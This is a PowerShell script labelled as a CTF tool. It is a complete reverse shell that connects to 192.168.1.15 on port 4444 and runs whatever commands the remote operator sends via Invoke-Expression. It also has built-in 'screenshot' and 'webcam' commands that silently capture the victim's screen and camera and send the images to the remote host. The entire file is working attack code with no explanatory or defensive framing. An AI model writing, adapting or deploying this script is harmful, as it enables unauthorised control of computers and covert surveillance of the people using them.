# --- THE ULTIMATE ATOMIC CTF SHELL ---
$ip = '192.168.1.15'
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient
try {
    $c.Connect($ip, $port)
    $s = $c.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- SYSTEM COMPROMISED: $($env:COMPUTERNAME) ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $line = $r.ReadLine()
        if ($null -eq $line) { break }
        
        $cmd = $line.Trim()
        if ($cmd -eq "exit") { break }
        if ([string]::IsNullOrWhiteSpace($cmd)) { continue }

        if ($cmd -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp  = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g    = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem  = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $out  = [Convert]::ToBase64String($mem.ToArray())
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
                $w.WriteLine($out)
            } catch { $w.WriteLine("Screenshot Error: $($_.Exception.Message)") }
        } 
        elseif ($cmd -eq "webcam") {
            try {
                [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
                $mc = New-Object Windows.Media.Capture.MediaCapture
                
                # 1. Initialize and FORCE wait for the result
                $initTask = $mc.InitializeAsync()
                while ($initTask.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
                $initTask.GetResults() | Out-Null # This ensures the object is "Ready"
                
                # 2. Hardware "Warm-up" (The secret sauce)
                Start-Sleep -Milliseconds 500
                
                # 3. Prepare the capture
                $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
                $prep = $mc.PrepareLowLagPhotoCaptureAsync($fmt)
                while ($prep.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
                
                $lowLag = $prep.GetResults()
                
                # 4. Snap the photo
                $snap = $lowLag.CaptureAsync()
                while ($snap.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
                
                $photo = $snap.GetResults()
                $stream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
                $ms = New-Object System.IO.MemoryStream
                $stream.CopyTo($ms)
                
                $out = [Convert]::ToBase64String($ms.ToArray())
                $ms.Dispose(); $stream.Dispose(); $mc.Dispose()
                $w.WriteLine($out)
            } catch { $w.WriteLine("Webcam Error: $($_.Exception.Message)") }
        } 
        else {
            try {
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                if ([string]::IsNullOrWhiteSpace($out)) { $out = "Done." }
                $w.WriteLine($out)
            } catch { $w.WriteLine("Shell Error: $($_.Exception.Message)") }
        }
    }
} catch {
} finally {
    if ($c) { $c.Close() }
}
